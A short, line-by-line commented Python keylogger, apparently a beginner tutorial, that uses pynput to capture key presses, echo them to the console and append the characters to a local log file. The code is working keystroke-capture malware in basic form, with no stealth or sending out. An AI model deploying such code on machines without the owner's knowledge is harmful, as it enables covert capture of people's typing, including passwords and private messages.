# This file contains the complete keylogger script with detailed explanations of each component, including how the code works, libraries used, etc... #


from pynput import keyboard             # A keyboard module that will allow the capture of user input.

def keyPressed(key):                            # Creates a function named keyPressed that receives the key that was pressed.
    print(str(key))                             # Converts the key to a string and displays it.
    with open("keyfile.text", 'a') as logKey:   # Opens file if present, creates file if not w/ that name. 'a' ensures we append to the file.
        try:                                    # Attempt this code even if it might fail.
            char = key.char                     # Extracts the actual characters.
            logKey.write(char)                  # Write it to the file.
        except:
            print("Error getting char")                     # If anything goes wrong, print this...

if __name__ == "__main__":                                  # Ensures this only runs when the .py file is directly used.
        listener = keyboard.Listener(on_press=keyPressed)   # Creates a listener object that calls the keyPressed function every time a key is pressed.
        listener.start()                                    # Starts the keyboard.listener from above.
        input()


# Thanks for stopping by! #
